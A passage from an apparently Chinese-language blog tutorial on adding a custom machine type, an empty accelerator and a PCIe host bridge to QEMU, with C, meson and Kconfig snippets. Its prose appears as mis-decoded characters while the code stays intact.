æ­¤å¯¹äºæˆ‘ä»¬éœ€è¦åˆ›å»ºçš„æ–°çš„æœºå™¨ç±»å‹ï¼Œæˆ‘ä»¬éœ€è¦åˆ†åˆ«å®šä¹‰ä»–çš„çŠ¶æ€ç±»ä¸ç±»å‹ç±»ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/osdep.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu-common.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/boards.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qom/object.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;sysemu/sysemu.h&quot;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCMachineState</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    MachineState parent;<br><br>    Notifier machine_done;<br>&#125; A3PCMachineState;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCMachineClass</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    MachineClass parent;<br>&#125; A3PCMachineClass;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯¹äºç»§æ‰¿è‡ª MachineState çš„å­ç±»æˆ‘ä»¬æ·»åŠ äº†ä¸€ä¸ªæ–°çš„ <code>Notifier</code> ç±»å‹çš„æˆå‘˜ï¼Œå¯ä»¥ç”¨æ¥åœ¨åé¢æ„å»ºäº‹ä»¶é€šçŸ¥é“¾</p><p>æˆ‘ä»¬è¿˜éœ€è¦å®šä¹‰ä¸€äº›ç›¸åº”çš„çˆ¶å­ç±»é—´è½¬å‹çš„å®ï¼Œä»¥åŠä¸€ä¸ªè¡¨ç¤ºæ–°å¢çš„ <code>a3-pc</code> ç±»å‹çš„å®ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_A3PC_MACHINE MACHINE_TYPE_NAME(<span class="hljs-string">&quot;a3-pc&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3PC_MACHINE(obj) \</span><br><span class="hljs-meta">    OBJECT_CHECK(A3PCMachineState, (obj), TYPE_A3PC_MACHINE)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3PC_MACHINE_GET_CLASS(obj) \</span><br><span class="hljs-meta">    OBJECT_GET_CLASS(A3PCMachineClass, obj, TYPE_A3PC_MACHINE)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3PC_MACHINE_CLASS(klass) \</span><br><span class="hljs-meta">    OBJECT_CLASS_CHECK(A3PCMachineClass, klass, TYPE_A3PC_MACHINE)</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬å®šä¹‰ MachineState ä¸ MachineClass çš„åˆå§‹åŒ–å‡½æ•°ï¼Œè¿™é‡Œåªæ˜¯ä¸€ä¸ªæœ€æœ€ç®€å•çš„ç©ºæ¨¡æ¿ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_machine_init_done</span><span class="hljs-params">(Notifier *notifier, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_machine_init</span><span class="hljs-params">(MachineState *machine)</span><br>&#123;<br>    A3PCMachineState *ms = A3PC_MACHINE(machine);<br><br>    ms-&gt;machine_done.notify = a3_pc_machine_init_done;<br>    qemu_add_machine_init_done_notifier(&amp;ms-&gt;machine_done);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_machine_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    MachineClass *mc = MACHINE_CLASS(oc);<br><br>    mc-&gt;init = a3_pc_machine_init;<br>    <span class="hljs-comment">// è¿™é‡Œè®¾ç½®äº†ä¸€ä¸ªå‚æ•°ï¼ŒæŒ‡å®šäº†ä½¿ç”¨æˆ‘ä»¬è‡ªå·±çš„ accelerator</span><br>    mc-&gt;default_machine_opts = <span class="hljs-string">&quot;accel=a3acl&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦å£°æ˜ä¸€ä¸ª <code>TypeInfo</code> ç±»å‹çš„å˜é‡ï¼Œç”¨æ¥è¡¨ç¤ºæˆ‘ä»¬æ–°å»ºçš„è¿™ä¸€ç§æœºå™¨ç±»å‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3_pc_machine_info = &#123;<br>    .name = TYPE_A3PC_MACHINE,<br>    .parent = TYPE_MACHINE,<br>    .instance_size = <span class="hljs-keyword">sizeof</span>(A3PCMachineState),<br>    .class_size = <span class="hljs-keyword">sizeof</span>(A3PCMachineClass),<br>    .class_init = a3_pc_machine_class_init,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; &#125;,<br>    &#125;,<br>&#125;;<br></code></pre></td></tr></table></figure><p>æœ€åå°±æ˜¯æ³¨å†Œæˆ‘ä»¬çš„æ–°æœºå™¨ç±»å‹äº†ï¼Œè¿™é‡Œä½¿ç”¨ <code>type_init()</code> æ¥å®Œæˆï¼ŒåŸç†æ˜¯ gcc constructor attribute ä½¿å…¶ä¼šè°ƒç”¨ <code>a3_pc_machine_register()</code> æ¥æ³¨å†Œ <code>a3_pc_machine_info</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_machine_register</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    type_register_static(&amp;a3_pc_machine_info);<br>&#125;<br>type_init(a3_pc_machine_register);<br></code></pre></td></tr></table></figure><h3 id="IIã€accel-cï¼šaccelerator-å®šä¹‰"><a href="#IIã€accel-cï¼šaccelerator-å®šä¹‰" class="headerlink" title="IIã€accel.cï¼šaccelerator å®šä¹‰"></a>IIã€accel.cï¼šaccelerator å®šä¹‰</h3><p>æ¥ä¸‹æ¥å°±æ˜¯å®šä¹‰æˆ‘ä»¬è‡ªå·±çš„ acceleratorï¼Œå› ä¸º Qemu é»˜è®¤éœ€è¦ä¸€ä¸ª acceleratorï¼Œä½†å¦‚æœå†å»å’ŒåŸæœ‰çš„ accelerator åšé€‚é…å°±å¤ªéº»çƒ¦äº†ï¼ˆ<del>å› ä¸ºğŸ‘´æ˜¯æ‡’ğŸ•</del>ï¼‰ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬è‡ªå·±å®šä¹‰ä¸€ä¸ªç©ºçš„ acceleratorï¼Œä¸è¿‡è¿™ä¸€éƒ¨åˆ†æˆ‘ä»¬åªéœ€è¦å£°æ˜ä¸€ä¸ªæ–°çš„ <code>TypeInfo</code> ç±»å‹å˜é‡å³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/osdep.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/module.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/boards.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/qdev-core.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;sysemu/accel.h&quot;</span></span><br><br><span class="hljs-type">bool</span> a3_pc_allowed;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3_pc_init</span><span class="hljs-params">(MachineState *ms)</span><br>&#123;<br>    MachineClass *mc = MACHINE_GET_CLASS(ms);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * opt out of system RAM being allocated by generic code</span><br><span class="hljs-comment">     */</span><br>    mc-&gt;default_ram_id = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_accel_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    AccelClass *ac = ACCEL_CLASS(oc);<br>    <span class="hljs-type">static</span> GlobalProperty compat[] = &#123;<br>        &#123; <span class="hljs-string">&quot;migration&quot;</span>, <span class="hljs-string">&quot;store-global-state&quot;</span>, <span class="hljs-string">&quot;off&quot;</span> &#125;,<br>        &#123; <span class="hljs-string">&quot;migration&quot;</span>, <span class="hljs-string">&quot;send-configuration&quot;</span>, <span class="hljs-string">&quot;off&quot;</span> &#125;,<br>        &#123; <span class="hljs-string">&quot;migration&quot;</span>, <span class="hljs-string">&quot;send-section-footer&quot;</span>, <span class="hljs-string">&quot;off&quot;</span> &#125;,<br>    &#125;;<br><br>    ac-&gt;name = <span class="hljs-string">&quot;A3ACL&quot;</span>;<br>    ac-&gt;init_machine = a3_pc_init;<br>    ac-&gt;allowed = &amp;a3_pc_allowed;<br>    ac-&gt;compat_props = g_ptr_array_new();<br><br>    compat_props_add(ac-&gt;compat_props, compat, G_N_ELEMENTS(compat));<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_A3_ACCEL ACCEL_CLASS_NAME(<span class="hljs-string">&quot;a3acl&quot;</span>)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3_pc_accel_type = &#123;<br>    .name = TYPE_A3_ACCEL,<br>    .parent = TYPE_ACCEL,<br>    .class_init = a3_pc_accel_class_init,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_type_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    type_register_static(&amp;a3_pc_accel_type);<br>&#125;<br><br>type_init(a3_pc_type_init);<br></code></pre></td></tr></table></figure><h4 id="æ–°ç‰ˆæœ¬-accelerator-é¢å¤–æ·»åŠ -ops"><a href="#æ–°ç‰ˆæœ¬-accelerator-é¢å¤–æ·»åŠ -ops" class="headerlink" title="*æ–°ç‰ˆæœ¬ accelerator é¢å¤–æ·»åŠ  ops"></a>*æ–°ç‰ˆæœ¬ accelerator é¢å¤–æ·»åŠ  ops</h4><p>éœ€è¦æ³¨æ„çš„æ˜¯ qemu çš„ 7.0 å’Œ 5.0 çš„ç‰ˆæœ¬ä¹‹é—´ä»£ç æ¶æ„æœ‰ä¸€å®šçš„æ”¹åŠ¨ï¼Œæ‰€ä»¥å¯¹äº 7.0 ç‰ˆæœ¬æˆ‘ä»¬è¿˜éœ€è¦é¢å¤–å®šä¹‰ä¸€ä¸ª AccelClassOpsï¼š</p><blockquote><p> å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ç”¨åŸæœ‰çš„ accelerator ï¼Œæ¯”å¦‚è¯´ <code>tcg</code>ï¼Œç›´æ¥åœ¨ machine.c ä»£ç ä¸­æŒ‡å®š <code>accel=tcg</code> å³å¯</p></blockquote><blockquote><p>æ·»åŠ æ–‡ä»¶ï¼šaccel&#x2F;a3acl&#x2F;a3acl-accel-ops.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * QEMU A3ACL vCPU common functionality</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Copyright (c) 22 arttnba3</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * Just modify it like what you want : )</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/osdep.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu-common.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;sysemu/accel-ops.h&quot;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3acl_handle_interrupt</span><span class="hljs-params">(CPUState *cpu, <span class="hljs-type">int</span> mask)</span><br>&#123;<br>    <span class="hljs-comment">// do nothing</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3acl_kick_vcpu_thread</span><span class="hljs-params">(CPUState *unused)</span><br>&#123;<br>    <span class="hljs-comment">// do nothing</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3acl_start_vcpu_thread</span><span class="hljs-params">(CPUState *cpu)</span><br>&#123;<br>    <span class="hljs-comment">// do nothing</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3acl_accel_ops_init</span><span class="hljs-params">(AccelOpsClass *ops)</span><br>&#123;<br>    <span class="hljs-comment">// è¿™å‡ ä¸ªå‡½æ•°å¯ä»¥æŒ‰ç…§ä¸ªäººéœ€è¦æ¥è¿›è¡Œæ”¹é€ ï¼Œç¬”è€…è¿™é‡Œä»…ä½œå ä½ç¬¦</span><br>    ops-&gt;create_vcpu_thread = a3acl_start_vcpu_thread;<br>    ops-&gt;kick_vcpu_thread = a3acl_kick_vcpu_thread;<br>    ops-&gt;handle_interrupt = a3acl_handle_interrupt;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3acl_accel_ops_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    AccelOpsClass *ops = ACCEL_OPS_CLASS(oc);<br><br>    ops-&gt;ops_init = a3acl_accel_ops_init;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3acl_accel_ops_type = &#123;<br>    .name = ACCEL_OPS_NAME(<span class="hljs-string">&quot;a3acl&quot;</span>),<br>    .parent = TYPE_ACCEL_OPS,<br>    .class_init = a3acl_accel_ops_class_init,<br>    .abstract = <span class="hljs-literal">true</span>,<br>&#125;;<br>module_obj(ACCEL_OPS_NAME(<span class="hljs-string">&quot;a3acl&quot;</span>));<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3acl_accel_ops_register_types</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    type_register_static(&amp;a3acl_accel_ops_type);<br>&#125;<br>type_init(a3acl_accel_ops_register_types);<br><br></code></pre></td></tr></table></figure><blockquote><p>æ·»åŠ æ–‡ä»¶ï¼šaccel&#x2F;a3acl&#x2F;meson.build</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs meson">a3acl_ss = ss.source_set()<br>a3acl_ss.add(files(<br>  &#x27;a3acl-accel-ops.c&#x27;,<br>))<br><br>specific_ss.add_all(when: &#x27;CONFIG_A3ACL&#x27;, if_true: a3acl_ss)<br></code></pre></td></tr></table></figure><blockquote><p>ä¿®æ”¹æ–‡ä»¶ï¼šaccel&#x2F;meson.build</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs meson">if have_system<br>  subdir(&#x27;hvf&#x27;)<br>  subdir(&#x27;qtest&#x27;)<br>  subdir(&#x27;kvm&#x27;)<br>  subdir(&#x27;xen&#x27;)<br>  subdir(&#x27;stubs&#x27;)<br>  subdir(&#x27;a3acl&#x27;) # åŠ ä¸Šè¿™å¥<br>endif<br></code></pre></td></tr></table></figure><blockquote><p>ä¿®æ”¹æ–‡ä»¶ï¼šaccel&#x2F;Kconfig</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kconfig"># æ·»åŠ ä¸Šè¿™ï¼š<br>config A3ACL<br>    bool<br>    default y<br></code></pre></td></tr></table></figure><h2 id="ä¸‰ã€æ·»åŠ è®¾å¤‡ç»“æ„ğŸ•Š"><a href="#ä¸‰ã€æ·»åŠ è®¾å¤‡ç»“æ„ğŸ•Š" class="headerlink" title="ä¸‰ã€æ·»åŠ è®¾å¤‡ç»“æ„ğŸ•Š"></a>ä¸‰ã€æ·»åŠ è®¾å¤‡ç»“æ„ğŸ•Š</h2><p>ç°åœ¨æˆ‘ä»¬å·²ç»æœ‰äº†ä¸€å°å¯ä»¥è¿è¡Œçš„ç©ºç™½çš„æœºå™¨â€”â€”ä½†åŒ…æ‹¬ CPU åœ¨å†…çš„æ‰€æœ‰è®¾å¤‡ç›®å‰æš‚ä¸”éƒ½æ˜¯ä¸å­˜åœ¨çš„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨åœ°æ„é€ æœºå™¨çš„è®¾å¤‡ç»“æ„</p><h3 id="Iã€æ·»åŠ æ–°çš„-PCIe-Host-Bridge"><a href="#Iã€æ·»åŠ æ–°çš„-PCIe-Host-Bridge" class="headerlink" title="Iã€æ·»åŠ æ–°çš„ PCIe Host Bridge"></a>Iã€æ·»åŠ æ–°çš„ PCIe Host Bridge</h3><p>ä¸€ä¸ªç©ºçš„æœºå™¨ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œé‚£è‡ªç„¶æ˜¯ä»€ä¹ˆéƒ½å¹²ä¸äº†çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆéœ€è¦ä¸ºè¿™ä¸ªæœºå™¨æ·»åŠ ä¸Šä¸€ä¸ª <code>PCIe Host Bridge</code>ï¼Œä»è€Œè®©æˆ‘ä»¬çš„æœºå™¨å¯ä»¥æ·»åŠ æ–°çš„ PCIe è®¾å¤‡</p><p>æƒ¯ä¾‹åœ°å°±æ˜¯å®šä¹‰ä¸€ä¸ªæ–°çš„ <code>PCIe Host Bridge</code> ç±»å‹çš„æ–° PCIe è®¾å¤‡ï¼š</p><blockquote><p>æ·»åŠ æ–‡ä»¶ï¼šinclude&#x2F;hw&#x2F;pci-host&#x2F;a3pc.h</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> HW_A3_PC_PCIE_HOST_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HW_A3_PC_PCIE_HOST_H</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;exec/memory.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/pci/pcie_host.h&quot;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCPCIEHost</span> &#123;</span><br>    PCIExpressHost parent_obj;<br><br>    MemoryRegion mem;<br>    MemoryRegion io;<br>&#125; A3PCPCIEHost;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_A3_PC_PCIE_HOST <span class="hljs-string">&quot;a3-pc-pcie-host&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3_PC_PCIE_HOST(obj) \</span><br><span class="hljs-meta">    OBJECT_CHECK(A3PCPCIEHost, (obj), TYPE_A3_PC_PCIE_HOST)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* HW_A3_PC_PCIE_HOST_H */</span></span><br></code></pre></td></tr></table></figure><blockquote><p>æ·»åŠ æ–‡ä»¶ï¼šhw&#x2F;pci-host&#x2F;a3pc.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/osdep.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu-common.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;exec/memory.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/qdev-properties.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/pci/pci.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/pci/pcie_host.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/pci-host/a3pc.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/error-report.h&quot;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_host_init</span><span class="hljs-params">(Object *obj)</span><br>&#123;<br>    <span class="hljs-comment">// nothing to do</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_pcie_set_irq</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, <span class="hljs-type">int</span> irq_num, <span class="hljs-type">int</span> level)</span><br>&#123;<br>    warn_report(<span class="hljs-string">&quot;A3-PC: not support INTx (irq %d, level %d)&quot;</span>,<br>                irq_num, level);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3_pc_pcie_swizzle_map_irq_fn</span><span class="hljs-params">(PCIDevice *pci_dev, <span class="hljs-type">int</span> pin)</span><br>&#123;<br>    warn_report(<span class="hljs-string">&quot;A3-PC: not support INTx (pin %d)&quot;</span>, pin);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_pcie_host_realize</span><span class="hljs-params">(DeviceState *dev, Error **errp)</span><br>&#123;<br>    PCIHostState *pci = PCI_HOST_BRIDGE(dev);<br>    A3PCPCIEHost *h = A3_PC_PCIE_HOST(dev);<br>    SysBusDevice *sbd = SYS_BUS_DEVICE(dev);<br><br>    memory_region_init(&amp;h-&gt;mem, OBJECT(h), <span class="hljs-string">&quot;a3-pc-mem&quot;</span>, <span class="hljs-number">16</span>);<br>    memory_region_init(&amp;h-&gt;io, OBJECT(h), <span class="hljs-string">&quot;a3-pc-io&quot;</span>, <span class="hljs-number">16</span>);<br>    sysbus_init_mmio(sbd, &amp;h-&gt;mem);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * A PCIe host in QEMU is required to provide</span><br><span class="hljs-comment">     * a pair of 